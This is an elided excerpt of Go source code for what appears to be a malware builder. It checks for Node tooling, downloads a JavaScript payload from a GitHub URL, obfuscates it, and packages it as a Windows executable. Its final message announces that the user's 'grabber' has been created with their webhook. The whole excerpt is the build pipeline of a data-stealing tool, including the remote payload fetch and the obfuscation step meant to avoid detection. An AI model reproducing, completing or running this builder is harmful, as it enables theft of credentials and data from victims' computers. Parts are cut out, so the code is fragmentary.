...
func buildPlatform() {
	...
	for _, platform := range cfg.Platform {
		...
		case "windows":
			...
			if err != nil {
				Fatal("Você deve ter o node instalado e adicionado ao seu (PATH) para usar este programa. Vejo: https://nodejs.org/en/download/  | Sairá em 5 segundos"", err)
			...
			if err != nil {
				Fatal("Please make sure package.json and package-lock.json are in the same folder that the .exe | Sairá em 5 segundos"", err)
				time.Sleep(5 * time.Second)
				os.Exit(1)
			}
			// Check pkg
			...
			if err != nil {
				...
				if err != nil {
					Fatal(`Erro ao instalar nexe, "npm install -g nexe", execute este comando no cmd por favor. Sairá em 5 segundos`, err)
					time.Sleep(5 * time.Second)
					os.Exit(1)
				}
			}
			Info("Building Windows")
			wincode := getCode("https://raw.githubusercontent.com/youngvalak/index-win.js/main/index-win.js")
			...
			if cfg.Obfuscate {
				...
				if err != nil {
					...
					if err != nil {
						Fatal(`Erro ao instalar javascript-obfuscator, "npm install -g javascript-obfuscator", execute este comando no cmd por favor. Sairá em 5 segundos`, err)
						time.Sleep(5 * time.Second)
						os.Exit(1)
					}
				}
				...
				if err != nil {
					Fatal("Erro ao ofuscar", err)
				}
				Info(fmt.Sprintf(`Out Obf Command: %s`, out))
				time.Sleep(time.Second)
				versions := []string{"win32-x64-12.9.0"}
				...
				if err != nil {
					Info("Erro ao remover arquivo", err)
				}
			...
			Info("O seu grabber foi criado com seu webhook")
